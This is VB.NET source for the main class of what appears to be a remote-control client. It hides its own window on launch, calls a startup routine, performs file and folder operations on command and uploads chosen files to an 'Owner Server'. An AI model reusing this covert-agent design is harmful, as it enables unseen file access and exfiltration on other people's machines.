Imports System.IO.Compression
Public Class Main
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "ZipFiles"
    Function DirToZip(ByVal dirPath As String, ByVal zipPath As String) 'Funciona. 09/04/2022 01:19 AM
        Try
            ZipFile.CreateFromDirectory(dirPath, zipPath, vbNull, True)
            Return "Zip created!"
        Catch ex As Exception
            Return AddToLog("DirToZip@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function ZipToDir(ByVal zipPath As String, ByVal dirPath As String) 'Funciona. 09/04/2022 01:21 AM
        Try
            ZipFile.ExtractToDirectory(zipPath, dirPath)
            Return "Zip decompressed!"
        Catch ex As Exception
            Return AddToLog("ZipToDir@Main", "Error: " & ex.Message, True)
        End Try
    End Function
#End Region

#Region "FileSystem"
    Function RenameFile(ByVal filePath As String, ByVal fileName As String)  'Funciona. 09/04/2022 01:24 AM
        Try
            My.Computer.FileSystem.RenameFile(filePath, fileName)
            Return "File " & filePath & " has been renamed to " & fileName
        Catch ex As Exception
            Return AddToLog("RenameFile@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function RenameDirectory(ByVal dirPath As String, ByVal dirName As String) 'Funciona. 09/04/2022 01:25 AM
        Try
            My.Computer.FileSystem.RenameDirectory(dirPath, dirName)
            Return "Directory " & dirPath & " has been renamed to " & dirName
        Catch ex As Exception
            Return AddToLog("RenameDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Function

    Function CopyFile(ByVal filePath As String, ByVal copiedFilePath As String) 'Funciona. 09/04/2022 01:26 AM
        Try
            My.Computer.FileSystem.CopyFile(filePath, copiedFilePath, True)
            Return "File " & filePath & " has been copied to " & copiedFilePath
        Catch ex As Exception
            Return AddToLog("CopyFile@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function CopyDirectory(ByVal dirPath As String, ByVal copiedDirPath As String) 'Funciona. 09/04/2022 01:29 AM
        Try
            My.Computer.FileSystem.CopyDirectory(dirPath, copiedDirPath, True)
            Return "Directory " & dirPath & " has been copied to " & copiedDirPath
        Catch ex As Exception
            Return AddToLog("CopyDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Function

    Function MoveFile(ByVal filePath As String, ByVal newFilePath As String) 'Funciona. 09/04/2022 01:30 AM
        Try
            My.Computer.FileSystem.MoveFile(filePath, newFilePath, True)
            Return "File " & filePath & " has been moved to " & newFilePath
        Catch ex As Exception
            Return AddToLog("MoveFile@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function MoveDirectory(ByVal dirPath As String, ByVal newDirPath As String) 'Funciona. 09/04/2022 01:31 AM
        Try
            My.Computer.FileSystem.MoveDirectory(dirPath, newDirPath, True)
            Return "Directory " & dirPath & " has been moved to " & newDirPath
        Catch ex As Exception
            Return AddToLog("MoveDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Function

    Function GetFiles(ByVal dirPath As String) 'Funciona. 07/05/2022 00:23 AM
        Try
            Dim contenido As String = dirPath & vbCrLf
            For Each file As String In My.Computer.FileSystem.GetFiles(dirPath)
                contenido &= "  " & file & vbCrLf
            Next
            Return contenido
        Catch ex As Exception
            Return AddToLog("GetFiles@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function GetDirectories(ByVal dirPath As String) 'Funciona. 07/05/2022 00:24 AM
        Try
            Dim contenido As String = dirPath & vbCrLf
            For Each dirs As String In My.Computer.FileSystem.GetDirectories(dirPath)
                contenido &= "  " & dirs & vbCrLf
            Next
            Return contenido
        Catch ex As Exception
            Return AddToLog("GetDirectories@Main", "Error: " & ex.Message, True)
        End Try
    End Function

    Function FileInfo(ByVal filePath As String) 'Funciona. 07/05/2022 00:25 AM
        Try
            Dim contenido As String = filePath & vbCrLf
            Dim information = My.Computer.FileSystem.GetFileInfo(filePath)
            contenido &= "  File name: " & information.Name &
                vbCrLf & "  Size: " & information.Length &
                vbCrLf & "  Extension: " & information.Extension &
                vbCrLf & "  isReadOnly: " & information.IsReadOnly &
                vbCrLf & "  Creation: " & information.CreationTime &
                vbCrLf & "  Last Access: " & information.LastAccessTime &
                vbCrLf & "  Last Write: " & information.LastWriteTime
            Return contenido
        Catch ex As Exception
            Return AddToLog("FileInfo@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function DirectoryInfo(ByVal dirPath As String) 'Funciona. 07/05/2022 00:27 AM
        Try
            Dim contenido As String = dirPath & vbCrLf
            Dim files As Integer = 0
            Dim directories As Integer = 0
            For Each file As String In My.Computer.FileSystem.GetFiles(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
                files += 1
            Next
            For Each dirs As String In My.Computer.FileSystem.GetDirectories(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
                directories += 1
            Next
            Dim information = My.Computer.FileSystem.GetDirectoryInfo(dirPath)
            contenido &= "  Directory name: " & information.Name &
                vbCrLf & "  " & files & " files, " & directories & " directories" &
                vbCrLf & "  Creation: " & information.CreationTime &
                vbCrLf & "  Last Access: " & information.LastAccessTime &
                vbCrLf & "  Last Write: " & information.LastWriteTime
            Return contenido
        Catch ex As Exception
            Return AddToLog("DirectoryInfo@Main", "Error: " & ex.Message, True)
        End Try
    End Function
#End Region

    Function UploadFile(ByVal filePath As String) 'Funciona. 09/04/2022 01:36 AM
        Try
            If BoroHearSendFile(filePath) Then
                Return "File sended to Owner Server! " & IO.Path.GetFileName(filePath)
            End If
            Return "File send was not successful."
        Catch ex As Exception
            Return AddToLog("UploadFile@Main", "Error: " & ex.Message, True)
        End Try
    End Function
End Class